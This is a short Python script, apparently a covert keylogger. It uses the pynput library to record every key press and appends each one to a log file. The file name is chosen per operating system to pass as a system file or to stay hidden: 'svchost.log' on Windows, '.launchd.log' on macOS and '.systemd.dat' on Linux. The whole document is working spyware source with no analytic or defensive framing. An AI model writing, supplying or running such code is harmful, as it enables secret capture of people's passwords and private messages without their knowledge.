from pynput.keyboard import Key, Listener
import platform

def on_press(key):
    """Handle key press events and log them to file."""
    try:
        # Handle alphanumeric keys
        key_data = key.char
    except AttributeError:
        # Handle special keys (e.g., Key.space, Key.enter)
        key_data = str(key).replace("Key.", "")
        
    write_file(key_data)
   
 
def write_file( key_data):
    if platform.system() == "Windows":
        with open('svchost.log', 'a') as f:
            f.write(f"{key_data} ")
                
    elif platform.system() == "Darwin":
        with open('.launchd.log', 'a') as f:
            f.write(f"{key_data} ")
                
    elif platform.system() == "Linux":
        with open('.systemd.dat', 'a') as f:
            f.write(f"{key_data} ")


with Listener(on_press=on_press) as listener:
    listener.join()
